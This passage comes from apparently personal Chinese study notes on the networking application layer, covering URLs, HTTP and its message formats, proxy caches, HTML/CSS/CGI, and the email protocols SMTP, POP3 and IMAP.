连接进行可靠的传送。</li></ul><blockquote><p>怎样使不同作者创作的不同风格的万维网文档都能在互联网上的各种主机上显示出来，同时使用户清楚地知道在什么地方存在着链接？</p></blockquote><ul><li>使用超文本标记语言 HTML (HyperText Markup Language) 。</li></ul><blockquote><p>怎样使用户能够很方便地找到所需的信息？</p></blockquote><ul><li>使用各种的搜索工具（即搜索引擎）。</li></ul><h2 id="3-2-统一资源定位符-URL"><a href="#3-2-统一资源定位符-URL" class="headerlink" title="3.2 统一资源定位符 URL"></a>3.2 统一资源定位符 URL</h2><p>URL是对互联网上资源的位置和访问方法的一种简洁表示。给资源的位置提供一种抽象的识别方法，并用这种方法给资源定位。</p><ul><li>实际上就是在互联网上的资源的地址。</li></ul><p>显然，互联网上的所有资源，都有一个唯一确定的URL。</p><ul><li>资源：指在互联网上可以被访问的任何对象，包括文件目录、文件、文档、图像、声音等，以及与互联网相连的任何形式的数据。</li></ul><p>URL 相当于一个文件名在网络范围的扩展。因此，URL 是与互联网相连的机器上的任何可访问对象的一个指针。</p><h3 id="3-2-1-URL-的格式"><a href="#3-2-1-URL-的格式" class="headerlink" title="3.2.1 URL 的格式"></a>3.2.1 URL 的格式</h3><p>由以冒号（:）隔开的两大部分组成，对字符大写或小写没有要求。</p><p>一般形式：</p><p><img src="/2024/06/09/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%AC%AC6%E7%AB%A0%EF%BC%9A%E5%BA%94%E7%94%A8%E5%B1%82/image_iO1iMrsrE-.png"></p><ul><li><strong>主机</strong>：存放资源的主机在互联网中的域名，也可以是用点分十进制的 IP 地址。</li><li><strong>端口</strong>：端口号。省略时使用默认端口号。</li><li><strong>路径</strong>：资源所在目录位置。区分大小写。省略时使用所定义的默认路径。后面可能还有一些选项。</li></ul><h3 id="3-2-2-使用-HTTP-的-URL"><a href="#3-2-2-使用-HTTP-的-URL" class="headerlink" title="3.2.2 使用 HTTP 的 URL"></a>3.2.2 使用 HTTP 的 URL</h3><p><img src="/2024/06/09/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%AC%AC6%E7%AB%A0%EF%BC%9A%E5%BA%94%E7%94%A8%E5%B1%82/image_L_oeKc8rKY.png"></p><h2 id="3-3-超文本传送协议-HTTP"><a href="#3-3-超文本传送协议-HTTP" class="headerlink" title="3.3 超文本传送协议 HTTP"></a>3.3 超文本传送协议 HTTP</h2><p>HTTP 是面向事务的 (transaction-oriented) 应用层协议。使用 TCP 连接进行可靠的传送。其定义了浏览器与万维网服务器通信的格式和规则。是万维网上能够可靠地交换文件（包括文本、声音、图像等各种多媒体文件）的重要基础。</p><p>HTTP 不仅传送完成超文本跳转所必需的信息，而且也传送任何可从互联网上得到的信息，如文本、超文本、声音和图像等。</p><h3 id="3-3-1-HTTP-的操作过程"><a href="#3-3-1-HTTP-的操作过程" class="headerlink" title="3.3.1 HTTP 的操作过程"></a>3.3.1 HTTP 的操作过程</h3><p><img src="/2024/06/09/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%AC%AC6%E7%AB%A0%EF%BC%9A%E5%BA%94%E7%94%A8%E5%B1%82/image_qgJGty6KsP.png"></p><p>HTTP 规定：在 HTTP 客户与 HTTP 服务器之间的每次交互，都由一个 ASCII 码串构成的请求和一个类似的通用互联网扩充，即“类MIME (MIME-like)”的响应组成。HTTP 报文通常都使用 TCP 连接传送。</p><h3 id="3-3-2-HTTP-的主要特点"><a href="#3-3-2-HTTP-的主要特点" class="headerlink" title="3.3.2 HTTP 的主要特点"></a>3.3.2 HTTP 的主要特点</h3><ol><li>HTTP 使用了<strong>面向连接的TCP</strong>作为运输层协议，保证了数据的可靠传输。</li><li>HTTP 协议本身也是<strong>无连接</strong>的。</li><li>HTTP 是<strong>无状态的</strong> (stateless)，同一个客户第二次访问同一个服务器上的页面时，服务器的响应与第一次被访问时相同，简化了服务器的设计，使服务器更容易支持大量并发的 HTTP 请求。</li></ol><h3 id="3-3-3-协议-HTTP-1-0-的主要缺点"><a href="#3-3-3-协议-HTTP-1-0-的主要缺点" class="headerlink" title="3.3.3 协议 HTTP&#x2F;1.0 的主要缺点"></a>3.3.3 协议 HTTP&#x2F;1.0 的主要缺点</h3><ol><li>每请求一个文档就要有两倍 RTT 的开销。</li><li>客户和服务器每一次建立新的 TCP 连接都要分配缓存和变量。</li><li>这种非持续连接使服务器的负担很重。</li></ol><p><img src="/2024/06/09/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%AC%AC6%E7%AB%A0%EF%BC%9A%E5%BA%94%E7%94%A8%E5%B1%82/image_Sa528SBmFA.png"></p><h3 id="3-3-4-协议-HTTP-1-1-使用持续连接"><a href="#3-3-4-协议-HTTP-1-1-使用持续连接" class="headerlink" title="3.3.4 协议 HTTP&#x2F;1.1 使用持续连接"></a>3.3.4 协议 HTTP&#x2F;1.1 使用持续连接</h3><p>持续连接（persistent connection）：服务器在发送响应后仍然在一段时间内保持这条连接（不释放），使同一个客户（浏览器）和该服务器可以继续在这条连接上传送后续的 HTTP 请求报文和响应报文。</p><p>只要文档都在同一个服务器上，就可以继续使用该 TCP 连接。</p><p>两种工作方式：</p><ol><li>非流水线方式 (without pipelining)</li><li>流水线方式 (with pipelining)</li></ol><h4 id="3-3-4-1-非流水线方式"><a href="#3-3-4-1-非流水线方式" class="headerlink" title="3.3.4.1 非流水线方式"></a>3.3.4.1 非流水线方式</h4><ul><li>客户在收到前一个响应之后才能发出下一个请求</li><li>缺点：TCP 连接空闲状态</li></ul><p><img src="/2024/06/09/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%AC%AC6%E7%AB%A0%EF%BC%9A%E5%BA%94%E7%94%A8%E5%B1%82/image_wJ_JclJolE.png"></p><h4 id="3-3-4-2-流水线方式"><a href="#3-3-4-2-流水线方式" class="headerlink" title="3.3.4.2 流水线方式"></a>3.3.4.2 流水线方式</h4><ul><li>客户在收到响应报文之前就能够接着发送新的请求报文</li><li>连续的多个请求报文到达服务器后，服务器就可连续发回响应报文</li><li>下载效率提高</li></ul><p><img src="/2024/06/09/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%AC%AC6%E7%AB%A0%EF%BC%9A%E5%BA%94%E7%94%A8%E5%B1%82/image_u8mi5OJF3m.png"></p><h3 id="3-3-5-协议-HTTP-2"><a href="#3-3-5-协议-HTTP-2" class="headerlink" title="3.3.5 协议 HTTP&#x2F;2"></a>3.3.5 协议 HTTP&#x2F;2</h3><p>协议 HTTP&#x2F;2 是协议 HTTP&#x2F;1.1 的升级版本。</p><ol><li>服务器可以<strong>并行</strong>发回响应（使用同一个 TCP 连接）。</li><li>允许客户<strong>复用 TCP 连接</strong>进行多个请求。</li><li>把所有的报文都划分为许多较小的二进制编码的帧，并采用了新的压缩算法，不发送重复的首部字段，大大减小了首部的开销，提高了传输效率。</li><li>向后兼容。</li></ol><h3 id="3-3-6-代理服务器"><a href="#3-3-6-代理服务器" class="headerlink" title="3.3.6 代理服务器"></a>3.3.6 代理服务器</h3><p>代理服务器 (proxy server) 又称为万维网高速缓存 (Web cache)，它代表浏览器发出 HTTP 请求。</p><p>使用高速缓存可减少访问互联网服务器的时延。</p><p>不使用高速缓存的情况：</p><p><img src="/2024/06/09/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%AC%AC6%E7%AB%A0%EF%BC%9A%E5%BA%94%E7%94%A8%E5%B1%82/image_RgaD2BnPcx.png"></p><p>使用高速缓存的情况：</p><p><img src="/2024/06/09/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%AC%AC6%E7%AB%A0%EF%BC%9A%E5%BA%94%E7%94%A8%E5%B1%82/image_dt0ZGVOa0S.png"></p><ol><li>浏览器访问互联网的服务器时，先与校园网的高速缓存建立 TCP 连接，并向高速缓存发出 HTTP 请求报文。</li><li>若高速缓存已经存放了所请求的对象，则将此对象放入 HTTP 响应报文中返回给浏览器。</li><li>若未存放，高速缓存就代表浏览器与互联网上的源点服务器建立 TCP 连接，并发送 HTTP 请求报文。</li><li>源点服务器将所请求的对象放在 HTTP 响应报文中返回给校园网的高速缓存。</li><li>高速缓存收到对象后，先复制到本地存储器中（留待以后用），然后将该对象放在 HTTP 响应报文中，通过已建立的 TCP 连接，返回给请求该对象的浏览器。</li></ol><p>以代理服务器构成的<strong>内容分发网络CDN</strong>（Content Distribution Network）在互联网应用中起到了很大的作用。</p><h2 id="3-4-HTTP-的报文结构"><a href="#3-4-HTTP-的报文结构" class="headerlink" title="3.4 HTTP 的报文结构"></a>3.4 HTTP 的报文结构</h2><p>HTTP有两类报文：</p><ul><li><strong>请求报文</strong>：从客户向服务器的请求</li><li><strong>响应报文</strong>：从服务器到客户的回答</li></ul><p>由于 HTTP 是面向正文的 (text-oriented)，因此报文中每一个字段的值都是一些 ASCII 码串，每个字段的长度都是不确定的。</p><p>三个组成部分：</p><ul><li><strong>开始行</strong>：用于区分是请求报文还是响应报文。</li><li><strong>首部行</strong>：说明浏览器、服务器或报文主体的一些信息。可以有多行，也可以不使用。</li><li><strong>实体主体</strong>：请求报文中一般不用，响应报文中也可能没有该字段。</li></ul><h3 id="3-4-1-HTTP-的报文结构（请求报文）"><a href="#3-4-1-HTTP-的报文结构（请求报文）" class="headerlink" title="3.4.1 HTTP 的报文结构（请求报文）"></a>3.4.1 HTTP 的报文结构（请求报文）</h3><p><img src="/2024/06/09/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%AC%AC6%E7%AB%A0%EF%BC%9A%E5%BA%94%E7%94%A8%E5%B1%82/image_0w8rKr88Bv.png"></p><ul><li><strong>方法：</strong>对所请求的对象进行的操作，实际上就是一些命令。请求报文的类型是由它所采用的方法决定的。</li><li><strong>URL</strong>：所请求的资源的 URL。</li><li><strong>版本</strong>：HTTP 的版本。</li></ul><p>HTTP 请求报文的一些方法</p><p><img src="/2024/06/09/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%AC%AC6%E7%AB%A0%EF%BC%9A%E5%BA%94%E7%94%A8%E5%B1%82/image_e4UoTotcgs.png"></p><h4 id="3-4-1-1-HTTP-请求报文举例-xD"><a href="#3-4-1-1-HTTP-请求报文举例-xD" class="headerlink" title="3.4.1.1 HTTP 请求报文举例&#xD;"></a>3.4.1.1 HTTP 请求报文举例&#xD;</h4><p><img src="/2024/06/09/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%AC%AC6%E7%AB%A0%EF%BC%9A%E5%BA%94%E7%94%A8%E5%B1%82/image_ZAVzoxup4d.png"></p><h3 id="3-4-2-HTTP-的报文结构（响应报文）-xD"><a href="#3-4-2-HTTP-的报文结构（响应报文）-xD" class="headerlink" title="3.4.2 HTTP 的报文结构（响应报文）&#xD;"></a>3.4.2 HTTP 的报文结构（响应报文）&#xD;</h3><p><img src="/2024/06/09/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%AC%AC6%E7%AB%A0%EF%BC%9A%E5%BA%94%E7%94%A8%E5%B1%82/image_mgy1tCTeSp.png"></p><ul><li><strong>状态码</strong>：都是三位数字，分为5大类<ul><li>1xx 表示通知信息，如请求收到了或正在进行处理。</li><li>2xx 表示成功，如接受或知道了。</li><li>3xx 表示重定向，表示要完成请求还必须采取进一步的行动。</li><li>4xx 表示客户的差错，如请求中有错误的语法或不能完成。</li><li>5xx 表示服务器的差错，如服务器失效无法完成请求。</li></ul></li></ul><p>响应报文中常见到的三种状态行：</p><ol><li>HTTP&#x2F;1.1 202 Accepted 接受</li><li>HTTP&#x2F;1.1 400 Bad Request 错误的请求</li><li>Http&#x2F;1.1 404 Not Found 找不到</li></ol><h3 id="3-4-3-在服务器上存放用户的信息"><a href="#3-4-3-在服务器上存放用户的信息" class="headerlink" title="3.4.3 在服务器上存放用户的信息"></a>3.4.3 在服务器上存放用户的信息</h3><p>万维网使用 Cookie 跟踪在 HTTP 服务器和客户之间传递的状态信息。</p><p><img src="/2024/06/09/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%AC%AC6%E7%AB%A0%EF%BC%9A%E5%BA%94%E7%94%A8%E5%B1%82/image_9ZqEMF0ex7.png"></p><h2 id="3-5-万维网的文档"><a href="#3-5-万维网的文档" class="headerlink" title="3.5 万维网的文档"></a>3.5 万维网的文档</h2><p>在一个客户程序主窗口上显示出的万维网文档称为<strong>页面</strong>（page）。</p><p>页面制作的标准语言：<code>HTML</code>，分为：</p><ul><li><strong>静态万维网文档</strong>：内容不会改变。简单。</li><li><strong>动态万维网文档</strong>：文档的内容由应用程序动态创建。</li><li><strong>活动万维网文档</strong>：由浏览器端改变文档的内容。</li></ul><h3 id="3-5-1-超文本标记语言-HTML"><a href="#3-5-1-超文本标记语言-HTML" class="headerlink" title="3.5.1 超文本标记语言 HTML"></a>3.5.1 超文本标记语言 HTML</h3><p>超文本标记语言 HTML (HyperText Markup Language) 是一种制作万维网页面的标准语言，它消除了不同计算机之间信息交流的障碍，是万维网的重要基础 [RFC 2854]。</p><p>最新 HTML 5.0 增加了&lt;audio&gt;和&lt;video&gt;两个标签，实现对多媒体中的音频、视频使用的支持，增加了能够在移动设备上支持多媒体功能。</p><blockquote><p>注意：HTML 不是应用层的协议，它只是万维网浏览器使用的一种语言。</p></blockquote><p>HTML 定义了许多用于排版的命令（即标签）。把各种标签嵌入到万维网的页面中，构成了所谓的 HTML 文档。HTML 文档是一种可以用任何文本编辑器创建的 ASCII 码文件。HTML 文档的后缀：.html 或 .htm。</p><h4 id="3-5-1-1-HTML-文档中标签的用法-xD"><a href="#3-5-1-1-HTML-文档中标签的用法-xD" class="headerlink" title="3.5.1.1 HTML 文档中标签的用法&#xD;"></a>3.5.1.1 HTML 文档中标签的用法&#xD;</h4><p><img src="/2024/06/09/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%AC%AC6%E7%AB%A0%EF%BC%9A%E5%BA%94%E7%94%A8%E5%B1%82/image_D6o1WeHnuS.png"></p><h4 id="3-5-1-2-XML"><a href="#3-5-1-2-XML" class="headerlink" title="3.5.1.2 XML"></a>3.5.1.2 XML</h4><p>可扩展标记语言 <strong>XML</strong>(Extensible Markup Language) 和 HTML 很相似。</p><p>设计宗旨是：传输数据，而不是显示数据。</p><p>特点和优点：</p><ol><li>可用来标记数据、定义数据类型；</li><li>允许用户对自己的标记语言进行自定义，并且是无限制的；</li><li>简单，与平台无关；</li><li>将用户界面与结构化数据分隔开来；</li></ol><h4 id="3-5-1-3-XHTML"><a href="#3-5-1-3-XHTML" class="headerlink" title="3.5.1.3 XHTML"></a>3.5.1.3 XHTML</h4><p>可扩展超文本标记语言 XHTML (Extensible HTML) 与 HTML 4.01 几乎相同，是更严格的 HTML 版本。</p><p>作为一种 XML 应用被重新定义的 HTML，将逐渐取代 HTML。</p><h4 id="3-5-1-4-CSS"><a href="#3-5-1-4-CSS" class="headerlink" title="3.5.1.4 CSS"></a>3.5.1.4 CSS</h4><p>层叠样式表 CSS (Cascading Style Sheets) 是一种样式表语言，用于为 HTML 文档定义布局。</p><p>CSS 与 HTML 的区别：HTML 用于结构化内容，而 CSS 则用于格式化结构化的内容。</p><blockquote><p>例如：精确规定在浏览器上显示的字体、颜色、边距、高度、宽度、背景图像等。</p></blockquote><h3 id="3-5-2-动态万维网文档"><a href="#3-5-2-动态万维网文档" class="headerlink" title="3.5.2 动态万维网文档"></a>3.5.2 动态万维网文档</h3><p><strong>静态文档</strong>：该文档创作完毕后就存放在万维网服务器中，在被用户浏览的过程中，内容不会改变。</p><p><strong>动态文档</strong>：文档的内容是在浏览器访问万维网服务器时才由应用程序动态创建。</p><ul><li>动态文档和静态文档之间的主要差别体现在服务器端：<strong>文档内容的生成方法不同</strong>。从浏览器的角度看，这两种文档并没有区别。</li></ul><p>从上面的描述可以看出，要实现动态文档就要以下两个方面对万维网服务器的功能进行扩充：</p><ol><li>增加一个应用程序：处理浏览器发来的数据，并创建动态文档。</li><li>增加一个机制：使万维网服务器把浏览器发来的数据传送给这个应用程序，然后万维网服务器能够解释这个应用程序的输出，并向浏览器返回 HTML 文档。</li></ol><p><img src="/2024/06/09/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%AC%AC6%E7%AB%A0%EF%BC%9A%E5%BA%94%E7%94%A8%E5%B1%82/image_lVCDlr8VEo.png"></p><h4 id="3-5-2-1-CGI-xD"><a href="#3-5-2-1-CGI-xD" class="headerlink" title="3.5.2.1 CGI&#xD;"></a>3.5.2.1 CGI&#xD;</h4><p>通用网关接口 CGI (Common Gateway Interface) ：定义动态文档应如何创建，输入数据应如何提供给应用程序，以及输出结果应如何使用的一种标准。</p><ul><li>通用：CGI 标准所定义的规则对其他任何语言都是通用的。</li><li>网关：CGI 程序的作用像网关。</li><li>接口：有一些已定义好的变量和调用等可供其他 CGI 程序使用。</li></ul><h4 id="3-5-2-2-CGI-网关程序-xD"><a href="#3-5-2-2-CGI-网关程序-xD" class="headerlink" title="3.5.2.2 CGI 网关程序&#xD;"></a>3.5.2.2 CGI 网关程序&#xD;</h4><p>正式名字：CGI 脚本 (script)。</p><ul><li>脚本：指的是一个程序，它被另一个程序（解释程序）而不是计算机的处理机来解释或执行。</li><li>脚本语言 (script language)：如 Perl, JavaScript，Tcl&#x2F;Tk 等。也可用一些常用的编程语言写出，如 C，C++等。</li></ul><p>脚本运行起来要比一般的编译程序要慢。脚本不一定是一个独立的程序，可以是一个动态装入的库，甚至是服务器的一个子程序。</p><blockquote><p>CGI 程序又称为 cgi-bin 脚本，因为在许多万维网服务器上，将 CGI 程序放在 &#x2F;cgi-bin 的目录下。</p></blockquote><hr><h1 id="4-电子邮件"><a href="#4-电子邮件" class="headerlink" title="4 电子邮件"></a>4 电子邮件</h1><h2 id="4-1-电子邮件概述"><a href="#4-1-电子邮件概述" class="headerlink" title="4.1 电子邮件概述"></a>4.1 电子邮件概述</h2><p>电子邮件 (e-mail)：指使用电子设备交换的邮件及其方法。</p><p><strong>优点</strong>：使用方便，传递迅速，费用低廉，可以传送多种类型的信息（包括：文字信息，声音和图像等）。</p><p><strong>重要标准</strong>：</p><ul><li>简单邮件发送协议：SMTP</li><li>互联网文本报文格式</li><li>通用互联网邮件扩充 MIME</li><li>邮件读取协议：POP3 和 IMAP</li></ul><p><img src="/2024/06/09/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%AC%AC6%E7%AB%A0%EF%BC%9A%E5%BA%94%E7%94%A8%E5%B1%82/image_8wAjbhUff5.png"></p><h3 id="4-1-1-用户代理-UA（User-Agent）"><a href="#4-1-1-用户代理-UA（User-Agent）" class="headerlink" title="4.1.1 用户代理 UA（User Agent）"></a>4.1.1 用户代理 UA（User Agent）</h3><p>用户与电子邮件系统的接口。又被称为电子邮件客户端软件。</p><p>基本功能：撰写、显示、处理、通信。</p><h3 id="4-1-2-邮件服务器（Mail-Server）"><a href="#4-1-2-邮件服务器（Mail-Server）" class="headerlink" title="4.1.2 邮件服务器（Mail Server）"></a>4.1.2 邮件服务器（Mail Server）</h3><ul><li>被称为邮件传输代理。</li><li>功能：发送和接收邮件，同时还要向发信人报告邮件传送的情况。</li><li>按照客户服务器方式工作。</li></ul><p>邮件发送和读取使用不同的协议。</p><ol><li>简单邮件发送协议 SMTP：用于在用户代理向邮件服务器或邮件服务器之间发送邮件。</li><li>邮局协议 POP3：用于用户代理从邮件服务器读取邮件。</li></ol><p>邮件服务器必须能够同时充当客户和服务器。SMTP 和 POP3（或 IMAP）都使用 <strong>TCP</strong> 连接可靠地传送邮件。</p><p><img src="/2024/06/09/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%AC%AC6%E7%AB%A0%EF%BC%9A%E5%BA%94%E7%94%A8%E5%B1%82/image_AtcP1_jWxH.png"></p><blockquote><p>注意：邮件不会在互联网中的某个中间邮件服务器落地。</p></blockquote><h3 id="4-1-3-电子邮件的组成-xD"><a href="#4-1-3-电子邮件的组成-xD" class="headerlink" title="4.1.3 电子邮件的组成&#xD;"></a>4.1.3 电子邮件的组成&#xD;</h3><p>电子邮件由信封 (envelope) 和内容 (content) 两部分组成。电子邮件的传输程序根据邮件信封上的信息来传送邮件。</p><p>用户在从自己的邮箱中读取邮件时才能见到邮件的内容。</p><h3 id="4-1-4-电子邮件地址的格式-xD"><a href="#4-1-4-电子邮件地址的格式-xD" class="headerlink" title="4.1.4 电子邮件地址的格式&#xD;"></a>4.1.4 电子邮件地址的格式&#xD;</h3><p>在邮件的信封上，最重要的就是收件人的地址。</p><p>TCP&#x2F;IP 体系的电子邮件系统规定电子邮件地址的格式如下：</p><p><img src="/2024/06/09/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%AC%AC6%E7%AB%A0%EF%BC%9A%E5%BA%94%E7%94%A8%E5%B1%82/image_4uaVh-rATj.png"></p><h2 id="4-2-简单邮件传送协议-SMTP"><a href="#4-2-简单邮件传送协议-SMTP" class="headerlink" title="4.2 简单邮件传送协议 SMTP"></a>4.2 简单邮件传送协议 SMTP</h2><p><img src="/2024/06/09/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%AC%AC6%E7%AB%A0%EF%BC%9A%E5%BA%94%E7%94%A8%E5%B1%82/image_F5uzxLhFbS.png"></p><blockquote><p>SMTP 规定了在两个相互通信的 SMTP 进程之间交换信息的方法。</p></blockquote><p><img src="/2024/06/09/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%AC%AC6%E7%AB%A0%EF%BC%9A%E5%BA%94%E7%94%A8%E5%B1%82/image_leBntHV02v.png"></p><p>SMTP 是一个基于文本的（即 ASCII 码）的协议。SMTP 客户与服务器之间采用命令-响应方式进行交互。</p><blockquote><p>SMTP 使用客户服务器方式。</p></blockquote><p><img src="/2024/06/09/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%AC%AC6%E7%AB%A0%EF%BC%9A%E5%BA%94%E7%94%A8%E5%B1%82/image_iVoqyGtSvo.png"></p><ul><li>SMTP 基于 TCP 实现客户与服务器的通信。</li></ul><h3 id="4-2-1-SMTP-通信的三个阶段-xD"><a href="#4-2-1-SMTP-通信的三个阶段-xD" class="headerlink" title="4.2.1 SMTP 通信的三个阶段&#xD;"></a>4.2.1 SMTP 通信的三个阶段&#xD;</h3><ol><li>连接建立：连接是在发送主机的 SMTP 客户和接收主机的 SMTP 服务器之间建立的。SMTP 不使用中间的邮件服务器。&#x20;</li><li>邮件传送</li><li>连接释放：邮件发送完毕后，SMTP 应释放 TCP 连接。</li></ol><h3 id="4-2-2-连接建立"><a href="#4-2-2-连接建立" class="headerlink" title="4.2.2 连接建立"></a>4.2.2 连接建立</h3><p><img src="/2024/06/09/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%AC%AC6%E7%AB%A0%EF%BC%9A%E5%BA%94%E7%94%A8%E5%B1%82/image_62Q8_mc8ib.png"></p><p>发件人的邮件送到发送方邮件服务器的邮件缓存后，SMTP客户就每隔一定时间对邮件缓冲扫描一次。如发现有邮件，就是用SMTP的熟知端口号25与接收方邮件服务器的SMTP服务器建立TCP连接。</p><p>如在一定时间内发送不了邮件，邮件服务器会把这个情况通知发件人。</p><p>SMTP不使用中间的邮件服务器，不管发送方和接收方的邮件服务器有多远，不管要经过多少个路由器，TCP连接总是在发送方和接收方这两个邮件服务器之间直接建立。</p><h3 id="4-2-3-邮件传送"><a href="#4-2-3-邮件传送" class="headerlink" title="4.2.3 邮件传送"></a>4.2.3 邮件传送</h3><p><img src="/2024/06/09/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%AC%AC6%E7%AB%A0%EF%BC%9A%E5%BA%94%E7%94%A8%E5%B1%82/image_aiJc1qwCKu.png"></p><p>邮件的传送从MAIL命令开始，MAIL命令后面有发件人的地址。若SMTP服务器已准备好接收邮件，则回答“250 OK”。否则，返回一个代码，指出原因。</p><p>下面跟着一个或多个RCPT命令，取决于把同一个邮件发送给一个或多个收件人。每发送一个RCPT命令，都应有相应的信息从SMTP服务器返回。</p><blockquote><p>RCPT命令的作用是：先弄清楚接收方系统是否已做好接受邮件的准备，然后才发送邮件。这样做是为了避免浪费通信资源，不至于发送了很长的邮件以后才知道地址错误。</p></blockquote><p>再下面就是DATA命令，表示要开始传送邮件的内容了。虽然SMTP使用TCP连接试图使邮件的传送可靠，但是“发送成功”不代表“收件人读取了这个邮件”，再往后的情况如何，有以下几种可能：</p><ol><li>接受方的邮件服务器刚收到邮件后就出现故障，使收到的邮件全部丢失。</li><li>收件人未查看自己的邮件。</li><li>收件人的邮箱容量用尽，无法接受新的邮件。</li><li>被误判为垃圾邮件。</li></ol><h3 id="4-2-4-连接释放"><a href="#4-2-4-连接释放" class="headerlink" title="4.2.4 连接释放"></a>4.2.4 连接释放</h3><p><img src="/2024/06/09/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%AC%AC6%E7%AB%A0%EF%BC%9A%E5%BA%94%E7%94%A8%E5%B1%82/image_SaOiTtMDvu.png"></p><p>邮件发送完之后，SMTP客户应发送QUIT命令。SMTP服务器返回的使“221 服务关闭”，表示SMTP同意释放TCP连接，邮件传送过程结束。</p><h3 id="4-2-5-SMTP的缺点"><a href="#4-2-5-SMTP的缺点" class="headerlink" title="4.2.5 SMTP的缺点"></a>4.2.5 SMTP的缺点</h3><ol><li>FROM命令后面的地址可以随便填写</li><li>SMTP传送的邮件是明文，不利于保密</li></ol><p>针对上述问题，提出ESMTP，即扩充的SMTP。</p><h3 id="4-2-6-电子邮件的信息格式"><a href="#4-2-6-电子邮件的信息格式" class="headerlink" title="4.2.6 电子邮件的信息格式"></a>4.2.6 电子邮件的信息格式</h3><p>一个电子邮件分为信封和内容两大部分。RFC 5322 只规定了邮件内容中的首部 (header) 格式。邮件的主体 (body) 部分则让用户自由撰写。</p><p><img src="/2024/06/09/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%AC%AC6%E7%AB%A0%EF%BC%9A%E5%BA%94%E7%94%A8%E5%B1%82/image_DUCTFqj2G1.png"></p><h2 id="4-3-邮件读取协议-POP3-和-IMAP"><a href="#4-3-邮件读取协议-POP3-和-IMAP" class="headerlink" title="4.3 邮件读取协议 POP3 和 IMAP"></a>4.3 邮件读取协议 POP3 和 IMAP</h2><p>两个常用的邮件读取协议：</p><ol><li>POP3：邮局协议 (Post Office Protocol) 第3个版本</li><li>IMAP：网际报文存取协议 (Internet Message Access Protocol)</li></ol><h3 id="4-3-1-POP3协议"><a href="#4-3-1-POP3协议" class="headerlink" title="4.3.1 POP3协议"></a>4.3.1 POP3协议</h3><p>POP3 使用客户服务器方式，基于 TCP 实现客户与服务器的通信。</p><p><img src="/2024/06/09/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%AC%AC6%E7%AB%A0%EF%BC%9A%E5%BA%94%E7%94%A8%E5%B1%82/image_XQN-P5GjZU.png"></p><p>POP3 协议的一个特点是只要用户从 POP3 服务器读取了邮件，POP3 服务器就把该邮件删除。</p><h3 id="4-3-2-IMAP-协议-xD"><a href="#4-3-2-IMAP-协议-xD" class="headerlink" title="4.3.2 IMAP 协议&#xD;"></a>4.3.2 IMAP 协议&#xD;</h3><p><img src="/2024/06/09/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%AC%AC6%E7%AB%A0%EF%BC%9A%E5%BA%94%E7%94%A8%E5%B1%82/image_Shk1Mi251u.png"></p><p>lMAP 使用客户服务器方式，并且 lMAP 基于 TCP 实现客户与服务器的通信。lMAP 是一个联机协议。</p><h4 id="4-3-2-1-IMAP-的特点-xD"><a href="#4-3-2-1-IMAP-的特点-xD" class="headerlink" title="4.3.2.1 IMAP 的特点&#xD;"></a>4.3.2.1 IMAP 的特点&#xD;</h4><ol><li>连接后只下载邮件首部（部分下载）。</li><li>用户直接在 IMAP 服务器上创建和管理文件夹。</li><li>用户可以搜索邮件内容。</li><li>用户可以在不同的地方使用不同的计算机随时上网阅读和处理自己的邮件。</li><li>允许收信人只读取邮件中的某一个部分。</li></ol><blockquote><p>缺点：要想查阅邮件，必须先联网。</p></blockquote><h3 id="4-3-3-IMAP-与-POP3-比较-xD"><a href="#4-3-3-IMAP-与-POP3-比较-xD" class="headerlink" title="4.3.3 IMAP 与 POP3 比较&#xD;"></a>4.3.3 IMAP 与 POP3 比较&#xD;</h3><p><img src="/2024/06/09/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%AC%AC6%E7%AB%A0%EF%BC%9A%E5%BA%94%E7%94%A8%E5%B1%82/image_0RbknxDwpI.png"></p><p><img src="/2024/06/09/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%AC%AC6%E7%AB%A0%EF%BC%9A%E5%BA%94%E7%94%A8%E5%B1%82/image_ndLEEDJvKZ.png"></p><p>必须注意：</p><ol><li>邮件读取协议 POP 或 IMAP 与邮件传送协议 SMTP 